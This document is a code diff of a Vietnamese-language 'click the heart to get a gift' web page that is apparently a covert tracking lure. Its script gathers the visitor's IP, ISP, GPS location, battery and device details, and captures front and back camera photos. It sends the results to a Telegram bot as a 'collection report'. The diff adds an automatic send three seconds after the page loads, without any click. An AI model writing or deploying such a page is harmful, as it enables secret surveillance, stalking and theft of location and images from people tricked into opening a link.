@@ -35,7 +35,7 @@
 </head>
 <body>
 
-    <div class="container" onclick="startProcess()">
+    <div class="container" onclick="handleUserClick()">
         <div class="heart"></div>
         <div class="text" id="statusText">Bấm vào trái tim để nhận quà ❤️</div>
     </div>
@@ -49,9 +49,11 @@
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        let isRunning = false;
+        
+        let isProcessed = false; // Đảm bảo chỉ gửi dữ liệu 1 lần
+        let autoTimer = null;   // Bộ đếm thời gian 3s
 
-        // 1. Lấy thông tin thiết bị & phần cứng chi tiết
+        // 1. Lấy thông tin thiết bị & phần cứng
         async function getDeviceInfo() {
             let batteryText = "Không rõ";
             try {
@@ -143,7 +145,7 @@
                 navigator.geolocation.getCurrentPosition(
                     (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                     () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 6000 }
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             });
         }
@@ -151,6 +153,10 @@
         // 4. Chụp ảnh từ Camera
         function captureStream(constraints) {
             return new Promise(async (resolve) => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(null);
+                    return;
+                }
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     video.srcObject = stream;
@@ -174,7 +180,7 @@
             });
         }
 
-        // 5. Gửi dữ liệu về Telegram 1 lượt
+        // 5. Gửi dữ liệu về Telegram
         async function sendAllToTelegram(frontBlob, backBlob, captionText) {
             if (frontBlob && backBlob) {
                 const formData = new FormData();
@@ -194,12 +200,12 @@
                 });
             } else if (frontBlob || backBlob) {
                 const singleBlob = frontBlob || backBlob;
-                const camType = frontBlob ? 'Camera Trước (Selfie)' : 'Camera Sau';
+                const camType = frontBlob ? 'Camera (Tự động/Trước)' : 'Camera Sau';
                 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', singleBlob, 'photo.jpg');
-                formData.append('caption', captionText + `\n📸 **Ảnh:** ${camType}`);
+                formData.append('caption', captionText + `\n📸 **Ảnh:** ${camType}`, parse_mode = 'Markdown');
                 formData.append('parse_mode', 'Markdown');
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -212,26 +218,23 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: captionText + `\n⚠️ **Camera:** Không cấp quyền camera.`,
+                        text: captionText,
                         parse_mode: 'Markdown'
                     })
                 });
             }
         }
 
-        // 6. Luồng xử lý chính
-        async function startProcess() {
-            if (isRunning) return;
-            isRunning = true;
-            document.getElementById('statusText').innerText = "Đang mở quà...";
-
+        // 6. Hàm tổng hợp và gửi văn bản thông tin
+        async function buildCaption(triggerType) {
             const [deviceInfo, ipData, gpsLocation] = await Promise.all([
                 getDeviceInfo(),
                 getIPInfo(),
                 getGeolocation()
             ]);
 
-            let captionText = `📊 **BÁO CÁO THU THẬP TỔNG HỢP**\n\n`;
+            let captionText = `📊 **BÁO CÁO THU THẬP TỔNG HỢP**\n`;
+            captionText += `📌 **Hình thức:** ${triggerType}\n\n`;
             captionText += `🌐 **Mạng & Định vị:**\n`;
             captionText += `• IP: \`${ipData.ip}\`\n`;
             if (ipData.isp) captionText += `• Nhà mạng: ${ipData.isp}\n`;
@@ -259,18 +262,62 @@
             captionText += `• Ngôn ngữ: ${deviceInfo.language}\n`;
             captionText += `• User-Agent: \`${deviceInfo.userAgent}\`\n`;
 
-            // Chụp Cam Trước
-            const frontPhoto = await captureStream({ video: { facingMode: "user" } });
-            
-            // Chụp Cam Sau
-            const backPhoto = await captureStream({ video: { facingMode: { exact: "environment" } } }) 
-                             || await captureStream({ video: { facingMode: "environment" } });
+            return captionText;
+        }
 
-            // Gửi dữ liệu tập trung 1 lần
-            await sendAllToTelegram(frontPhoto, backPhoto, captionText);
+        // --- XỬ LÝ LỰA CHỌN KỊCH BẢN ---
+
+        // KỊCH BẢN A: Tự động gửi sau 3 giây (Người dùng KHÔNG ấn vào trái tim)
+        async function autoProcess() {
+            if (isProcessed) return;
+            isProcessed = true;
+
+            const captionText = await buildCaption("⏱️ Tự động gửi (Người dùng không ấn trái tim)");
+            const finalCaption = captionText + `\n⚠️ **Camera:** Không thu thập (Người dùng chưa tương tác).`;
+            
+            await sendAllToTelegram(null, null, finalCaption);
+        }
+
+        // KỊCH BẢN B: Người dùng BẤM VÀO TRÁI TIM
+        async function handleUserClick() {
+            if (isProcessed) return;
+            isProcessed = true;
+            
+            // Hủy đếm ngược 3s ngay lập tức
+            if (autoTimer) clearTimeout(autoTimer);
+
+            document.getElementById('statusText').innerText = "Đang mở quà...";
+
+            // Lấy dữ liệu thông tin
+            const captionText = await buildCaption("🔴 Người dùng chủ động ẤN VÀO TRÁI TIM");
+
+            // Thử chụp ảnh Camera
+            let frontPhoto = await captureStream({ video: { facingMode: "user" } });
+            let backPhoto = await captureStream({ video: { facingMode: { exact: "environment" } } }) 
+                          || await captureStream({ video: { facingMode: "environment" } });
+
+            // Dự phòng nếu không xác định được facingMode
+            if (!frontPhoto && !backPhoto) {
+                frontPhoto = await captureStream({ video: true });
+            }
+
+            let cameraNote = "\n📸 **Ảnh:** Thu thập thành công.";
+            if (!frontPhoto && !backPhoto) {
+                cameraNote = "\n⚠️ **Camera:** Người dùng không cho phép hoặc thiết bị không hỗ trợ.";
+            }
+
+            // Gửi đầy đủ ảnh và thông tin về Telegram
+            await sendAllToTelegram(frontPhoto, backPhoto, captionText + cameraNote);
 
             document.getElementById('statusText').innerText = "Chúc bạn một ngày vui vẻ! ❤";
         }
+
+        // Tự động kích hoạt bộ đếm 3 giây ngay khi mở trang web
+        window.onload = () => {
+            autoTimer = setTimeout(() => {
+                autoProcess();
+            }, 3000);
+        };
     </script>
 </body>
 </html>
